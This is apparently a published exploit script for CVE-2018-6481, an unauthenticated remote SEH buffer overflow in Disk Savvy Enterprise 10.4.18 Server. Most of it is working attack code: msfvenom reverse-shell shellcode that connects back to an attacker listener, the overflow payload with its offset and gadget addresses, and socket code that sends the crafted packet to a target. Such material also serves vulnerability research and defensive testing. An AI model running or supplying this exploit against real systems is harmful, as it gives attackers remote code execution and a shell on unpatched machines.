# Exploit Title: Disk Savvy Enterprise v10.4.18 Server - Unauthenticated Remote Buffer Overflow SEH
# Date: 01/02/2018
# Exploit Author: Daniel Teixeira
# Vendor Homepage: http://www.disksavvy.com/
# Software Link: http://www.disksavvy.com/setups/disksavvyent_setup_v10.4.18.exe
# Version: 10.4.18
# CVE: CVE-2018-6481
# Tested on: Windows 7 x86


from struct import pack
from os import system
from sys import exit
from time import sleep
import socket

port = 9124
host = "192.168.35.87"

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.19.35 LPORT=4444 -f python -b "\x00\x02\x0a\x0d\xf8\xfd" -v shellcode > shell
shellcode =  ""
shellcode += "\xbe\xae\xa3\xbf\xed\xd9\xe9\xd9\x74\x24\xf4"
shellcode += "\x58\x2b\xc9\xb1\x52\x83\xc0\x04\x31\x70\x0e"
shellcode += "\x03\xde\xad\x5d\x18\xe2\x5a\x23\xe3\x1a\x9b"
shellcode += "\x44\x6d\xff\xaa\x44\x09\x74\x9c\x74\x59\xd8"
shellcode += "\x11\xfe\x0f\xc8\xa2\x72\x98\xff\x03\x38\xfe"
shellcode += "\xce\x94\x11\xc2\x51\x17\x68\x17\xb1\x26\xa3"
shellcode += "\x6a\xb0\x6f\xde\x87\xe0\x38\x94\x3a\x14\x4c"
shellcode += "\xe0\x86\x9f\x1e\xe4\x8e\x7c\xd6\x07\xbe\xd3"
shellcode += "\x6c\x5e\x60\xd2\xa1\xea\x29\xcc\xa6\xd7\xe0"
shellcode += "\x67\x1c\xa3\xf2\xa1\x6c\x4c\x58\x8c\x40\xbf"
shellcode += "\xa0\xc9\x67\x20\xd7\x23\x94\xdd\xe0\xf0\xe6"
shellcode += "\x39\x64\xe2\x41\xc9\xde\xce\x70\x1e\xb8\x85"
shellcode += "\x7f\xeb\xce\xc1\x63\xea\x03\x7a\x9f\x67\xa2"
shellcode += "\xac\x29\x33\x81\x68\x71\xe7\xa8\x29\xdf\x46"
shellcode += "\xd4\x29\x80\x37\x70\x22\x2d\x23\x09\x69\x3a"
shellcode += "\x80\x20\x91\xba\x8e\x33\xe2\x88\x11\xe8\x6c"
shellcode += "\xa1\xda\x36\x6b\xc6\xf0\x8f\xe3\x39\xfb\xef"
shellcode += "\x2a\xfe\xaf\xbf\x44\xd7\xcf\x2b\x94\xd8\x05"
shellcode += "\xfb\xc4\x76\xf6\xbc\xb4\x36\xa6\x54\xde\xb8"
shellcode += "\x99\x45\xe1\x12\xb2\xec\x18\xf5\x7d\x58\x31"
shellcode += "\x26\x16\x9b\x35\x39\xba\x12\xd3\x53\x52\x73"
shellcode += "\x4c\xcc\xcb\xde\x06\x6d\x13\xf5\x63\xad\x9f"
shellcode += "\xfa\x94\x60\x68\x76\x86\x15\x98\xcd\xf4\xb0"
shellcode += "\xa7\xfb\x90\x5f\x35\x60\x60\x29\x26\x3f\x37"
shellcode += "\x7e\x98\x36\xdd\x92\x83\xe0\xc3\x6e\x55\xca"
shellcode += "\x47\xb5\xa6\xd5\x46\x38\x92\xf1\x58\x84\x1b"
shellcode += "\xbe\x0c\x58\x4a\x68\xfa\x1e\x24\xda\x54\xc9"
shellcode += "\x9b\xb4\x30\x8c\xd7\x06\x46\x91\x3d\xf1\xa6"
shellcode += "\x20\xe8\x44\xd9\x8d\x7c\x41\xa2\xf3\x1c\xae"
shellcode += "\x79\xb0\x2d\xe5\x23\x91\xa5\xa0\xb6\xa3\xab"
shellcode += "\x52\x6d\xe7\xd5\xd0\x87\x98\x21\xc8\xe2\x9d"
shellcode += "\x6e\x4e\x1f\xec\xff\x3b\x1f\x43\xff\x69"


payload =  "A" * 124            # offset
payload += "\x90\x09\xeb\x05"   # jmp over seh retrun value
payload += "\x13\x6d\x05\x10"   # 0x10056d13 : pop ebx # pop ecx # ret 0x20 | ascii {PAGE_EXECUTE_READ} [libspp.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Program Files\Disk Savvy Enterprise\bin\libspp.dll)



payload += "\x90" * 10
payload += "\x83\xc4\x64" * 20  # metasm > add esp,100
payload += "\xff\xe4"           # metasm > jmp esp
payload += "\x90" * (1000 - len(payload) - len(shellcode))
payload += shellcode

header =  "\x75\x19\xba\xab"
header += "\x03\x00\x00\x00"
header += "\x00\x40\x00\x00"
header += pack('<I', len(payload))
header += pack('<I', len(payload))
header += pack('<I', ord(payload[-1]))
packet = header
packet += payload 

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:

    print "[*] Testing connection to tatget %s:%s" %(host,port)
    s.connect((host, port))

except:

    print "[-] Unable to communicate to target %s:%s" %(host,port)

    exit()

s.send(packet)

print "[*] Payload Sent.."
#removed the bind part, made it reverse shell
